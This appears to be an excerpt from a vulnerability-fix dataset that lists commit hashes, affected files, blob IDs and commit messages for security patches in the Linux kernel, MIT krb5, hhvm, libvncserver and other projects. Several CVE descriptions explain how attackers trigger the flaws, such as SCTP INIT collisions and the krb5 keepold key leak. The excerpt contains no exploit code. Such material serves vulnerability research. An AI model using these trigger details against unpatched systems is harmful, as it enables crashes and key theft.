    950909f04ee6ab598a0bdd16f8d6ad6ec2a931ed
    be5fadf3473946a3b7ef886eeadcb2d219e867aa
    d276e2d4a5894c38c6489eb2f814542a181f6d75
    ec6606325cdaade4588f297455cd985503d1bad6
    f42cd091596602181f7d1a54ac0992a6ef40f371
    ffda81ef1a709df605ef128ebc866cb00c75fe32
Projects:
    0-T-0_ps4-linux
Commit Message for 3cf521f7dc87c031617fd47e4b7aa2593c2f3daf:
net/l2tp: don't fall back on UDP [get|set]sockopt\n\nThe l2tp [get|set]sockopt() code has fallen back to the UDP functions for socket option levels != SOL_PPPOL2TP since day one, but that has never actually worked, since the l2tp socket isn't an inet socket.\n\nAs David Miller points out:\n\n  "If we wanted this to work, it'd have to look up the tunnel and then    use tunnel->sk, but I wonder how useful that would be"\n\nSince this can never have worked so nobody could possibly have depended on that functionality, just remove the broken code and return -EINVAL.\n\nReported-by: Sasha Levin <sasha.levin@oracle.com> Acked-by: James Chapman <jchapman@katalix.com> Acked-by: David Miller <davem@davemloft.net> Cc: Phil Turnbull <phil.turnbull@oracle.com> Cc: Vegard Nossum <vegard.nossum@oracle.com> Cc: Willy Tarreau <w@1wt.eu> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    9c2cd3c93c05d009a91d84eedbb85873b0cb505d
File(s) In Commit: 
    librawstudio/rs-filter.c
Blob(s) In Commit: 
    352b23c51a00b32c4993732b1534ff5a988ee763
Blob(s) Before Fix: 
    4913c13d20cb66e19326f11c5bbc4a597c3267cd
Projects:
    giallu_rawstudio
Commit Message for 9c2cd3c93c05d009a91d84eedbb85873b0cb505d:
Fixes insecure use of temporary file (CVE-2014-4978).

======================================================================
Commit With Fix: 
    9938bcd1df8ea27052557c722a67b00c0e7d6cb6
File(s) In Commit: 
    application/controllers/admin/participantsaction.php
Blob(s) In Commit: 
    e6cef23fec75bf00e6b4368d82d2217a4a5cfdd4
Blob(s) Before Fix: 
    a679d70afd827032f4cf4c8a2190281116cbb01b
Projects:
    3limin4t0r_LimeSurvey
Commit Message for 9938bcd1df8ea27052557c722a67b00c0e7d6cb6:
Fixed issue: Search parameter vulnerability in CPDB

======================================================================
Commit With Fix: 
    295dc39d941dc2ae53d5c170365af4c9d5c16212
File(s) In Commit: 
    fs/namei.c
Blob(s) In Commit: 
    9eb787e5c167fb601845590f0181d249bf515fb0
Blob(s) Before Fix: 
    0b3138de2a3b79fd8d1bf1843e405506f343f605
    23ac50f4ee4086374d256aaf96a8f3f4055d09bd
    3531deebad3084104e6a9fca7116ba68890ad5af
    4b491b4319905b2dd6698d3f58aae1d0d0141499
    719c5ef2d0fd0deba9ff9ac03f65668cae514d88
    80168273396bbaeb4490677854fe34d637a78551
    8b61d103a8a7a15b0c5e8eab070e92f940a64b88
    8f77a8cea289350b9d0e427b284cc01a2df4691d
    985c6f3684859e17439d62c7d319611305414437
    9d768675b4803e67ce0751b30e1ddd8c4872bd75
    9ed9361223c08f30ebbcca48e165588adeb31378
    b2beee7a733fe3f862945f39042e04937f821741
    bdea10963aa5e2932c61082c2962fb2c48f62941
    c42791914f8205e8608923608a44fcab5478a6ea
    c6157c894fce234c333d5a2d787f81ee3e5e7ba9
    caa28051e197e898e3c2bc52afce37bcbb284853
    d580df2e6804d0863d555234388a34397387c3e6
Projects:
    0-T-0_ps4-linux
Commit Message for 295dc39d941dc2ae53d5c170365af4c9d5c16212:
fs: umount on symlink leaks mnt count\n\nCurrently umount on symlink blocks following umount:\n\n/vz is separate mount\n\n# ls /vz/ -al | grep test drwxr-xr-x.  2 root root       4096 Jul 19 01:14 testdir lrwxrwxrwx.  1 root root         11 Jul 19 01:16 testlink -> /vz/testdir # umount -l /vz/testlink umount: /vz/testlink: not mounted (expected)\n\n# lsof /vz # umount /vz umount: /vz: device is busy. (unexpected)\n\nIn this case mountpoint_last() gets an extra refcount on path->mnt\n\nSigned-off-by: Vasily Averin <vvs@openvz.org> Acked-by: Ian Kent <raven@themaw.net> Acked-by: Jeff Layton <jlayton@primarydata.com> Cc: stable@vger.kernel.org Signed-off-by: Christoph Hellwig <hch@lst.de>

======================================================================
Commit With Fix: 
    1be9a950c646c9092fb3618197f7b6bfb50e82aa
File(s) In Commit: 
    net/sctp/associola.c
Blob(s) In Commit: 
    06a9ee6b2d3a577a73b62028a711f5f801fe13f0
Blob(s) Before Fix: 
    0b999987b6587e594eb23781fe1d18ed995ee8e5
    31ed008c8e13e88b88935c5d83a503bdc089076e
    39579c3e0d14c12f165e420be064d7fbf248c0ad
    43cd0dd9149d42e2739985bd8bb4ea15c977de06
    4f6d6f9d127474b457cf274a1a0977bb75c6e8dc
    5829d932f07deb16b3143ac6bb39bd95a2679408
    5ae60920067470463420f0b3aa879e7c0999f200
    5d97d8fe4be72f63de55bc00ce1b4642c8edf73d
    68a27f9796d2ece54bcb53b98a47e8f98645077b
    878e17aafbe5c52b1545f5072261559639e2b061
    91cfd8f94a19e4c6cecd716fda03027007158816
    9de23a222d3f7b9f33e650483d749d3341c51dc0
    a6953b0436a51534ce29587d6b1352a9a3028c5e
    acd2edbc073ebf4ad334a4b0a16ff7b45413fac5
    bce5b79662a62b8bdc5e7c895a6ea4bcd147ed86
    cef509985192a041f8d437adc35cd540e32f58bd
    dc16b90ddb6f28d66b623fe820a8b457696d5560
    ee13d28d39d10702096f733ee8d88aa862459952
    f558433537b8f829a3f6147256abb7c5d23e4b47
Projects:
    0-T-0_ps4-linux
Commit Message for 1be9a950c646c9092fb3618197f7b6bfb50e82aa:
net: sctp: inherit auth_capable on INIT collisions\n\nJason reported an oops caused by SCTP on his ARM machine with SCTP authentication enabled:\n\nInternal error: Oops: 17 [#1] ARM CPU: 0 PID: 104 Comm: sctp-test Not tainted 3.13.0-68744-g3632f30c9b20-dirty #1 task: c6eefa40 ti: c6f52000 task.ti: c6f52000 PC is at sctp_auth_calculate_hmac+0xc4/0x10c LR is at sg_init_table+0x20/0x38 pc : [<c024bb80>]    lr : [<c00f32dc>]    psr: 40000013 sp : c6f538e8  ip : 00000000  fp : c6f53924 r10: c6f50d80  r9 : 00000000  r8 : 00010000 r7 : 00000000  r6 : c7be4000  r5 : 00000000  r4 : c6f56254 r3 : c00c8170  r2 : 00000001  r1 : 00000008  r0 : c6f1e660 Flags: nZcv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user Control: 0005397f  Table: 06f28000  DAC: 00000015 Process sctp-test (pid: 104, stack limit = 0xc6f521c0) Stack: (0xc6f538e8 to 0xc6f54000) [...] Backtrace: [<c024babc>] (sctp_auth_calculate_hmac+0x0/0x10c) from [<c0249af8>] (sctp_packet_transmit+0x33c/0x5c8) [<c02497bc>] (sctp_packet_transmit+0x0/0x5c8) from [<c023e96c>] (sctp_outq_flush+0x7fc/0x844) [<c023e170>] (sctp_outq_flush+0x0/0x844) from [<c023ef78>] (sctp_outq_uncork+0x24/0x28) [<c023ef54>] (sctp_outq_uncork+0x0/0x28) from [<c0234364>] (sctp_side_effects+0x1134/0x1220) [<c0233230>] (sctp_side_effects+0x0/0x1220) from [<c02330b0>] (sctp_do_sm+0xac/0xd4) [<c0233004>] (sctp_do_sm+0x0/0xd4) from [<c023675c>] (sctp_assoc_bh_rcv+0x118/0x160) [<c0236644>] (sctp_assoc_bh_rcv+0x0/0x160) from [<c023d5bc>] (sctp_inq_push+0x6c/0x74) [<c023d550>] (sctp_inq_push+0x0/0x74) from [<c024a6b0>] (sctp_rcv+0x7d8/0x888)\n\nWhile we already had various kind of bugs in that area ec0223ec48a9 ("net: sctp: fix sctp_sf_do_5_1D_ce to verify if we/peer is AUTH capable") and b14878ccb7fa ("net: sctp: cache auth_enable per endpoint"), this one is a bit of a different kind.\n\nGiving a bit more background on why SCTP authentication is needed can be found in RFC4895:\n\n  SCTP uses 32-bit verification tags to protect itself against   blind attackers. These values are not changed during the   lifetime of an SCTP association.\n\n  Looking at new SCTP extensions, there is the need to have a   method of proving that an SCTP chunk(s) was really sent by   the original peer that started the association and not by a   malicious attacker.\n\nTo cause this bug, we're triggering an INIT collision between peers  normal SCTP handshake where both sides intent to authenticate packets contains RANDOM  CHUNKS  HMAC-ALGO parameters that are being negotiated among peers:\n\n  ---------- INIT[RANDOM  CHUNKS  HMAC-ALGO] ---------->   <------- INIT-ACK[RANDOM  CHUNKS  HMAC-ALGO] ---------   -------------------- COOKIE-ECHO -------------------->   <-------------------- COOKIE-ACK ---------------------\n\nRFC4895 says that each endpoint therefore knows its own random number and the peer's random number *after* the association has been established. The local and peer's random number along with the shared key are then part of the secret used for calculating the HMAC in the AUTH chunk.\n\nNow, in our scenario, we have 2 threads with 1 non-blocking SEQ_PACKET socket each, setting up common shared SCTP_AUTH_KEY and SCTP_AUTH_ACTIVE_KEY properly, and each of them calling sctp_bindx(3), listen(2) and connect(2) against each other, thus the handshake looks similar to this, e.g.:\n\n  ---------- INIT[RANDOM  CHUNKS  HMAC-ALGO] ---------->   <------- INIT-ACK[RANDOM  CHUNKS  HMAC-ALGO] ---------   <--------- INIT[RANDOM  CHUNKS  HMAC-ALGO] -----------   -------- INIT-ACK[RANDOM  CHUNKS  HMAC-ALGO] -------->   ...\n\nSince such collisions can also happen with verification tags, the RFC4895 for AUTH rather vaguely says under section 6.1:\n\n  In case of INIT collision, the rules governing the handling   of this Random Number follow the same pattern as those for   the Verification Tag, as explained in Section 5.2.4 of   RFC 2960 [5]. Therefore, each endpoint knows its own Random   Number and the peer's Random Number after the association   has been established.\n\nIn RFC2960, section 5.2.4, we're eventually hitting Action B:\n\n  B) In this case, both sides may be attempting to start an      association at about the same time but the peer endpoint      started its INIT after responding to the local endpoint's      INIT. Thus it may have picked a new Verification Tag not      being aware of the previous Tag it had sent this endpoint.      The endpoint should stay in or enter the ESTABLISHED      state but it MUST update its peer's Verification Tag from      the State Cookie, stop any init or cookie timers that may      running and send a COOKIE ACK.\n\nIn other words, the handling of the Random parameter is the same as behavior for the Verification Tag as described in Action B of section 5.2.4.\n\nLooking at the code, we exactly hit the sctp_sf_do_dupcook_b() case which triggers an SCTP_CMD_UPDATE_ASSOC command to the side effect interpreter, and in fact it properly copies over peer_{random, hmacs, chunks} parameters from the newly created association to update the existing one.\n\nAlso, the old asoc_shared_key is being released and based on the new params, sctp_auth_asoc_init_active_key() updated. However, the issue observed in this case is that the previous asoc->peer.auth_capable was 0, and has *not* been updated, so that instead of creating a new secret, we're doing an early return from the function sctp_auth_asoc_init_active_key() leaving asoc->asoc_shared_key as NULL. However, we now have to authenticate chunks from the updated chunk list (e.g. COOKIE-ACK).\n\nThat in fact causes the server side when responding with ...\n\n  <------------------ AUTH  COOKIE-ACK -----------------\n\n... to trigger a NULL pointer dereference, since in sctp_packet_transmit(), it discovers that an AUTH chunk is being queued for xmit, and thus it calls sctp_auth_calculate_hmac().\n\nSince the asoc->active_key_id is still inherited from the endpoint, and the same as encoded into the chunk, it uses asoc->asoc_shared_key, which is still NULL, as an asoc_key and dereferences it in ...\n\n  crypto_hash_setkey(desc.tfm, &asoc_key->data[0], asoc_key->len)\n\n... causing an oops. All this happens because sctp_make_cookie_ack() called with the *new* association has the peer.auth_capable=1 and therefore marks the chunk with auth=1 after checking sctp_auth_send_cid(), but it is *actually* sent later on over the then *updated* association's transport that didn't initialize its shared key due to peer.auth_capable=0. Since control chunks in that case are not sent by the temporary association which are scheduled for deletion, they are issued for xmit via SCTP_CMD_REPLY in the interpreter with the context of the *updated* association. peer.auth_capable was 0 in the updated association (which went from COOKIE_WAIT into ESTABLISHED state), since all previous processing that performed sctp_process_init() was being done on temporary associations, that we eventually throw away each time.\n\nThe correct fix is to update to the new peer.auth_capable value as well in the collision case via sctp_assoc_update(), so that in case the collision migrated from 0 -> 1, sctp_auth_asoc_init_active_key() can properly recalculate the secret. This therefore fixes the observed server panic.\n\nFixes: 730fc3d05cd4 ("[SCTP]: Implete SCTP-AUTH parameter processing") Reported-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com> Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Tested-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com> Cc: Vlad Yasevich <vyasevich@gmail.com> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    530af9cb8e700e7596b3ec812bad123c9fa06356
File(s) In Commit: 
    deps/v8/src/isolate.h
Blob(s) In Commit: 
    2769ca7c9ac4da6a6ffd52a416ffb5c42a4a4f7b
Blob(s) Before Fix: 
    b90191d0eb5910e22e098c9218da4b7bf95ba112
Projects:
    0-Captain_node
Commit Message for 530af9cb8e700e7596b3ec812bad123c9fa06356:
v8: Interrupts must not mask stack overflow.\n\nBackport of https://codereview.chromium.org/339883002

======================================================================
Commit With Fix: 
    af0ed4df4dfae762ab5fb605f5a0c8f59cb4f6ca
File(s) In Commit: 
    src/lib/kadm5/srv/svr_principal.c
Blob(s) In Commit: 
    d4e74cc267f441c52f99377a98ae852e4b2df14b
Blob(s) Before Fix: 
    31048c07b31c6a09555db710db269702e9d2b33a
    5d358bd4cb443d5fbba88251b5496cb17183cc41
    bc66d5c74e1b14cdc72a759fac159554ffad8b04
    f405f55ca949911880e8c4bd9f088bc591a5625c
Projects:
    3van_krb5
Commit Message for af0ed4df4dfae762ab5fb605f5a0c8f59cb4f6ca:
Return only new keys in randkey [CVE-2014-5351]\n\nIn kadmind's randkey operation, if a client specifies the keepold flag, do not include the preserved old keys in the response.\n\nCVE-2014-5351:\n\nAn authenticated remote attacker can retrieve the current keys for a service principal when generating a new set of keys for that principal.  The attacker needs to be authenticated as a user who has the elevated privilege for randomizing the keys of other principals.\n\nNormally, when a Kerberos administrator randomizes the keys of a service principal, kadmind returns only the new keys.  This prevents an administrator who lacks legitimate privileged access to a service from forging tickets to authenticate to that service.  If the "keepold" flag to the kadmin randkey RPC operation is true, kadmind retains the old keys in the KDC database as intended, but also unexpectedly returns the old keys to the client, which exposes the service to ticket forgery attacks from the administrator.\n\nA mitigating factor is that legitimate clients of the affected service will start failing to authenticate to the service once they begin to receive service tickets encrypted in the new keys.  The affected service will be unable to decrypt the newly issued tickets, possibly alerting the legitimate administrator of the affected service.\n\nCVSSv2: AV:N/AC:H/Au:S/C:P/I:N/A:N/E:POC/RL:OF/RC:C\n\n[tlyu@mit.edu: CVE description and CVSS score]\n\nticket: 8018 (new) target_version: 1.13 tags: pullup

======================================================================
Commit With Fix: 
    d1f707024f1d0af6e54a18885322d70fa15ec4d3
File(s) In Commit: 
    src/plugins/kdb/ldap/libkdb_ldap/ldap_pwd_policy.c
Blob(s) In Commit: 
    6779f51c7bf93249a47a30f95d4e32a4b05444b0
Blob(s) Before Fix: 
    09cfb8ca031e92c30fa7669deb9dee0e313a709b
    522773e95b9362a6deaeae1587229141f31b6222
Projects:
    3van_krb5
Commit Message for d1f707024f1d0af6e54a18885322d70fa15ec4d3:
Fix LDAP misused policy name crash [CVE-2014-5353]\n\nIn krb5_ldap_get_password_policy_from_dn, if LDAP_SEARCH returns successfully with no results, return KRB5_KDB_NOENTRY instead of returning success with a zeroed-out policy object.  This fixes a null dereference when an admin attempts to use an LDAP ticket policy name as a password policy name.\n\nCVE-2014-5353:\n\nIn MIT krb5, when kadmind is configured to use LDAP for the KDC database, an authenticated remote attacker can cause a NULL dereference by attempting to use a named ticket policy object as a password policy for a principal.  The attacker needs to be authenticated as a user who has the elevated privilege for setting password policy by adding or modifying principals.\n\nQueries to LDAP scoped to the krbPwdPolicy object class will correctly not return entries of other classes, such as ticket policy objects, but may return success with no returned elements if an object with the requested DN exists in a different object class.  In this case, the routine to retrieve a password policy returned success with a password policy object that consisted entirely of zeroed memory.  In particular, accesses to the policy name will dereference a NULL pointer.  KDC operation does not access the policy name field, but most kadmin operations involving the principal with incorrect password policy will trigger the crash.\n\nThanks to Patrik Kis for reporting this problem.\n\nCVSSv2 Vector: AV:N/AC:M/Au:S/C:N/I:N/A:C/E:H/RL:OF/RC:C\n\n[kaduk@mit.edu: CVE description and CVSS score]\n\nticket: 8051 (new) target_version: 1.13.1 tags: pullup

======================================================================
Commit With Fix: 
    04038bf3633c4b909b5ded3072dc88c8c419bf16
File(s) In Commit: 
    src/plugins/kdb/ldap/libkdb_ldap/ldap_principal2.c
Blob(s) In Commit: 
    10b5982f164ac3ad8235c19b2081ef21ae942a6a
Blob(s) Before Fix: 
    3e560d997ac7a11c66894bb3d53577cc2fe16b61
Projects:
    3van_krb5
Commit Message for 04038bf3633c4b909b5ded3072dc88c8c419bf16:
Support keyless principals in LDAP [CVE-2014-5354]\n\nOperations like "kadmin -q 'addprinc -nokey foo'" or "kadmin -q 'purgekeys -all foo'" result in principal entries with no keys present, so krb5_encode_krbsecretkey() would just return NULL, which then got unconditionally dereferenced in krb5_add_ber_mem_ldap_mod().\n\nApply some fixes to krb5_encode_krbsecretkey() to handle zero-key principals better, correct the test for an allocation failure, and slightly restructure the cleanup handler to be shorter and more appropriate for the usage.  Once it no longer short-circuits when n_key_data is zero, it will produce an array of length two with both entries NULL, which is treated as an empty list by the LDAP library, the correct behavior for a keyless principal.\n\nHowever, attributes with empty values are only handled by the LDAP library for Modify operations, not Add operations (which only get a sequence of Attribute, with no operation field).  Therefore, only add an empty krbprincipalkey to the modlist when we will be performing a Modify, and not when we will be performing an Add, which is conditional on the (misspelled) create_standalone_prinicipal boolean.\n\nCVE-2014-5354:\n\nIn MIT krb5, when kadmind is configured to use LDAP for the KDC database, an authenticated remote attacker can cause a NULL dereference by inserting into the database a principal entry which contains no long-term keys.\n\nIn order for the LDAP KDC backend to translate a principal entry from the database abstraction layer into the form expected by the LDAP schema, the principal's keys are encoded into a NULL-terminated array of length-value entries to be stored in the LDAP database.  However, the subroutine which produced this array did not correctly handle the case where no keys were present, returning NULL instead of an empty array, and the array was unconditionally dereferenced while adding to the list of LDAP operations to perform.\n\nVersions of MIT krb5 prior to 1.12 did not expose a way for principal entries to have no long-term key material, and therefore are not vulnerable.\n\n    CVSSv2 Vector: AV:N/AC:M/Au:S/C:N/I:N/A:P/E:H/RL:OF/RC:C\n\nticket: 8041 (new) tags: pullup target_version: 1.13.1 subject: kadmind with ldap backend crashes when putting keyless entries

======================================================================
Commit With Fix: 
    ab6fdeb84fb090b48606b6f7933028cfe7bf3a5e
File(s) In Commit: 
    hphp/runtime/ext/mcrypt/ext_mcrypt.cpp
Blob(s) In Commit: 
    0dc3ae5d9ee6a0095ed2cb363171a4310f130903
Blob(s) Before Fix: 
    5999750fe39170ac473d24992a55c85946390f5f
    9e9ded802abce030b020b57de2330f71bb84dbaf
Projects:
    10000TB_hhvm
Commit Message for ab6fdeb84fb090b48606b6f7933028cfe7bf3a5e:
Fix mcrypt_create_iv(..., MCRYPT_RAND) to auto-seed RNG\n\nSummary: Without seeding the random number generator, we'll always get the same IV, and that reduces the security of this function.\n\nFortunately, f_rand() has all of that logic for auto-seeding and selection of a suitable initial seed built-in.\n\nRealistically, using MCRYPT_RAND should be deprecated. I'm going to wait on PHP Internals to make a decision on https://wiki.php.net/rfc/deprecate_mcrypt_rand before adding that warning however, so that our test suite remains consistent.\n\nCredit: Theodore R. Smith of PHP Experts, Inc. <theodorephpexperts.pro>\n\nCloses #3496\n\nReviewed By: @ptarjan\n\nDifferential Revision: D1502435

======================================================================
Commit With Fix: 
    95464495f1e3e714d5c295fe621af5d2e0d4238d
File(s) In Commit: 
    app/views/layouts/application.html.haml
Blob(s) In Commit: 
    1b8d8c0384caab9bfbebe3fcce27816754bc24b4
Blob(s) Before Fix: 
    2625a92c54ddab109f75e924eded2e14b44ad58c
Projects:
    0bserver07_fat_free_crm
Commit Message for 95464495f1e3e714d5c295fe621af5d2e0d4238d:
json_escape user input

======================================================================
Commit With Fix: 
    045a044e8ae79db9244593fbce154cdf6e843273
File(s) In Commit: 
    libvncclient/vncviewer.c
Blob(s) In Commit: 
    24bc6f8938d065105956ca79dcf87d59ab6cf351
Blob(s) Before Fix: 
    3b16a6f9873917d64d10aa994ea857d0c3a2b278
Projects:
    22MILES_libvncserver
Commit Message for 045a044e8ae79db9244593fbce154cdf6e843273:
Fix integer overflow in MallocFrameBuffer()\n\nPromote integers to uint64_t to avoid integer overflow issue during frame buffer allocation for very large screen sizes

======================================================================
Commit With Fix: 
    6037a9074d52b1963c97cb28ea1096c7c14cbf28
File(s) In Commit: 
    libvncserver/rfbserver.c
Blob(s) In Commit: 
    7e43fe3f9c7b639a1d919664b5c483bb771d95ce
Blob(s) Before Fix: 
    5f3b31d81dd558a0e7acf6e7923264765f5bf379
Projects:
    22MILES_libvncserver
Commit Message for 6037a9074d52b1963c97cb28ea1096c7c14cbf28:
Check malloc() return value on client->server ClientCutText message. Client can send up to 2**32-1 bytes of text, and such a large allocation is likely to fail in case of high memory pressure. This would in a server crash (write at address 0).

======================================================================
Commit With Fix: 
    05a9bd41a8ec0a9d580a8f420f41718bdd235446
File(s) In Commit: 
    libvncserver/rfbserver.c
Blob(s) In Commit: 
    df7d74c760031f65186e1e8affcfa95ef4397bc3
Blob(s) Before Fix: 
    5f3b31d81dd558a0e7acf6e7923264765f5bf379
    7e43fe3f9c7b639a1d919664b5c483bb771d95ce
Projects:
    22MILES_libvncserver
Commit Message for 05a9bd41a8ec0a9d580a8f420f41718bdd235446:
Do not accept a scaling factor of zero on PalmVNCSetScaleFactor and SetScale client->server messages. This would cause a division by zero and crash the server.

======================================================================
Commit With Fix: 
    7135ec229882370a00411aa50030eada6034cc1b
File(s) In Commit: 
    hphp/runtime/ext/ext_hash.cpp
Blob(s) In Commit: 
    cd55297c5319b7156f3dc22f83c190fa806ebe37
Blob(s) Before Fix: 
    6c5fca10c7b8717895a4273281afeec3a61677ab
    b4edc4b0fd63d4871fef0d1bc64d8a1f060597ca
    dad742fc431f1ece7bce7fd900c50fe9ffd93013
Projects:
    10000TB_hhvm
Commit Message for 7135ec229882370a00411aa50030eada6034cc1b:
Fix potential security leak in HashContext\n\nSummary: CVE-2014-6229\n\nThis is not a NUL-terminated string, it's a fixed-size block of data. The risks were key truncation (if there happens to be a NUL byte in the key) or over-reading (which would be information leakage).\n\nReviewed By: @ptarjan\n\nDifferential Revision: D1533546

======================================================================
Commit With Fix: 
    e3abe7d7585ecc420a7cab73313216613aadad5a
File(s) In Commit: 
    src/dissectors/ec_postgresql.c
Blob(s) In Commit: 
    95bf55270d7da92a53a263f1366a6393397894b1
Blob(s) Before Fix: 
    76ad1fca22eacc4cbca0e334ae4fd965eef46cbb
    a0023a042cdec5dfaa72bd0c5e8b0e5470a53edd
    fa2674164c55feef2896cd1aad617de0fae55b9f
Projects:
    0x0mar_ettercap
Commit Message for e3abe7d7585ecc420a7cab73313216613aadad5a:
Fixed heap overflow caused by length

======================================================================
Commit With Fix: 
    e3abe7d7585ecc420a7cab73313216613aadad5a
File(s) In Commit: 
    src/dissectors/ec_postgresql.c
Blob(s) In Commit: 
    95bf55270d7da92a53a263f1366a6393397894b1
Blob(s) Before Fix: 
    76ad1fca22eacc4cbca0e334ae4fd965eef46cbb
    a0023a042cdec5dfaa72bd0c5e8b0e5470a53edd
    fa2674164c55feef2896cd1aad617de0fae55b9f
Projects:
    0x0mar_ettercap
Commit Message for e3abe7d7585ecc420a7cab73313216613aadad5a:
Fixed heap overflow caused by length

======================================================================
Commit With Fix: 
    c03aa9f6e1f938618e6db2e23afef0574efeeb65
File(s) In Commit: 
    fs/udf/inode.c
Blob(s) In Commit: 
    a6a40536ebf139c018d1622acfea80fd52d8f5ae
Blob(s) Before Fix: 
    236cd48184c2df20e75bc9fee098ded782f2560f
    68cc7b144c260b432db070f324ab4443f143266d
    a932f7740b51714b47bada9099e5cdb966f79002
Projects:
    0-T-0_ps4-linux
Commit Message for c03aa9f6e1f938618e6db2e23afef0574efeeb65:
udf: Avoid infinite loop when processing indirect ICBs\n\nWe did not implement any bound on number of indirect ICBs we follow when loading inode. Thus corrupted medium could cause kernel to go into an infinite loop, possibly causing a stack overflow.\n\nFix the possible stack overflow by removing recursion from __udf_read_inode() and limit number of indirect ICBs we follow to avoid infinite loops.\n\nSigned-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    c27a3e4d667fdcad3db7b104f75659478e0c68d8
File(s) In Commit: 
    net/ceph/auth_x.c
Blob(s) In Commit: 
    de6662b14e1f5d7110ac1316c1362e4db6bffc5f
Blob(s) Before Fix: 
    0a25cec60f5ada728c265d5ddecefc237763450f
    0eb146dce1aa9e48309983c5a2768fdc98437f16
    10d87753ed8737329c244b1ae7718e95c8abd118
    1587dc6010c6276fd7c6e997bb7af6fe08d426be
    2034fb9266700e6b456b141db9b5d264aed77d62
    21f8a5b2b2840466e552b76eacaa578ace54b084
    644f12d2544ae892ada86f4eb9b46eb498244460
    7099bac74cbb6aab621402dacee2bea04a77d42b
    7e38b729696a97567e3c0d284631a3229ef413dd
    96238ba95f2b6954c598294243b8f65931a82284
    a16bf14eb027cd4e765320f98b0fb378b5a5e7c4
    b216131915e74a2c160623bb045f8ac0e3971927
    ba6eb17226da424d59bb462a2089186bbd3233af
    c1e49295103a0a087e85846049492c44d4ca352d
    c9eaab7255f94728e500e708f82f5d34f46b8c9e
    e24c42774690ac4d0f0799a26bd24706f805baeb
    f89c47021f4c6b0b276a8db3b2683721ae196a3d
Projects:
    0-T-0_ps4-linux
Commit Message for c27a3e4d667fdcad3db7b104f75659478e0c68d8:
libceph: do not hard code max auth ticket len\n\nWe hard code cephx auth ticket buffer size to 256 bytes.  This isn't enough for any moderate setups and, in case tickets themselves are not encrypted, leads to buffer overflows (ceph_x_decrypt() errors out, but ceph_decode_copy() doesn't - it's just a memcpy() wrapper).  Since the buffer is allocated dynamically anyway, allocated it a bit later, at the point where we know how much is going to be needed.\n\nFixes: http://tracker.ceph.com/issues/8979\n\nCc: stable@vger.kernel.org Signed-off-by: Ilya Dryomov <ilya.dryomov@inktank.com> Reviewed-by: Sage Weil <sage@redhat.com>

======================================================================
Commit With Fix: 
    c27a3e4d667fdcad3db7b104f75659478e0c68d8
File(s) In Commit: 
    net/ceph/auth_x.c
Blob(s) In Commit: 
    de6662b14e1f5d7110ac1316c1362e4db6bffc5f
Blob(s) Before Fix: 
    0a25cec60f5ada728c265d5ddecefc237763450f
    0eb146dce1aa9e48309983c5a2768fdc98437f16
    10d87753ed8737329c244b1ae7718e95c8abd118
    1587dc6010c6276fd7c6e997bb7af6fe08d426be
    2034fb9266700e6b456b141db9b5d264aed77d62
    21f8a5b2b2840466e552b76eacaa578ace54b084
    644f12d2544ae892ada86f4eb9b46eb498244460
    7099bac74cbb6aab621402dacee2bea04a77d42b
    7e38b729696a97567e3c0d284631a3229ef413dd
    96238ba95f2b6954c598294243b8f65931a82284
    a16bf14eb027cd4e765320f98b0fb378b5a5e7c4
    b216131915e74a2c160623bb045f8ac0e3971927
    ba6eb17226da424d59bb462a2089186bbd3233af
    c1e49295103a0a087e85846049492c44d4ca352d
    c9eaab7255f94728e500e708f82f5d34f46b8c9e
    e24c42774690ac4d0f0799a26bd24706f805baeb
    f89c47021f4c6b0b276a8db3b2683721ae196a3d
Projects:
    0-T-0_ps4-linux
Commit Message for c27a3e4d667fdcad3db7b104f75659478e0c68d8:
libceph: do not hard code max auth ticket len\n\nWe hard code cephx auth ticket buffer size to 256 bytes.  This isn't enough for any moderate setups and, in case tickets themselves are not encrypted, leads to buffer overflows (ceph_x_decrypt() errors out, but ceph_decode_copy() doesn't - it's just a memcpy() wrapper).  Since the buffer is allocated dynamically anyway, allocated it a bit later, at the point where we know how much is going to be needed.\n\nFixes: http://tracker.ceph.com/issues/8979\n\nCc: stable@vger.kernel.org Signed-off-by: Ilya Dryomov <ilya.dryomov@inktank.com> Reviewed-by: Sage Weil <sage@redhat.com>

======================================================================
Commit With Fix: 
    c27a3e4d667fdcad3db7b104f75659478e0c68d8
File(s) In Commit: 
    net/ceph/auth_x.c
Blob(s) In Commit: 
    de6662b14e1f5d7110ac1316c1362e4db6bffc5f
Blob(s) Before Fix: 
    0a25cec60f5ada728c265d5ddecefc237763450f
    0eb146dce1aa9e48309983c5a2768fdc98437f16
    10d87753ed8737329c244b1ae7718e95c8abd118
    1587dc6010c6276fd7c6e997bb7af6fe08d426be
    2034fb9266700e6b456b141db9b5d264aed77d62
    21f8a5b2b2840466e552b76eacaa578ace54b084
    644f12d2544ae892ada86f4eb9b46eb498244460
    7099bac74cbb6aab621402dacee2bea04a77d42b
    7e38b729696a97567e3c0d284631a3229ef413dd
    96238ba95f2b6954c598294243b8f65931a82284
    a16bf14eb027cd4e765320f98b0fb378b5a5e7c4
    b216131915e74a2c160623bb045f8ac0e3971927
    ba6eb17226da424d59bb462a2089186bbd3233af
    c1e49295103a0a087e85846049492c44d4ca352d
    c9eaab7255f94728e500e708f82f5d34f46b8c9e
    e24c42774690ac4d0f0799a26bd24706f805baeb
    f89c47021f4c6b0b276a8db3b2683721ae196a3d
Projects:
    0-T-0_ps4-linux
Commit Message for c27a3e4d667fdcad3db7b104f75659478e0c68d8:
libceph: do not hard code max auth ticket len\n\nWe hard code cephx auth ticket buffer size to 256 bytes.  This isn't enough for any moderate setups and, in case tickets themselves are not encrypted, leads to buffer overflows (ceph_x_decrypt() errors out, but ceph_decode_copy() doesn't - it's just a memcpy() wrapper).  Since the buffer is allocated dynamically anyway, allocated it a bit later, at the point where we know how much is going to be needed.\n\nFixes: http://tracker.ceph.com/issues/8979\n\nCc: stable@vger.kernel.org Signed-off-by: Ilya Dryomov <ilya.dryomov@inktank.com> Reviewed-by: Sage Weil <sage@redhat.com>

======================================================================
Commit With Fix: 
    a701ceeb410bdda9d96c9d3d12104630df5d5b43
File(s) In Commit: 
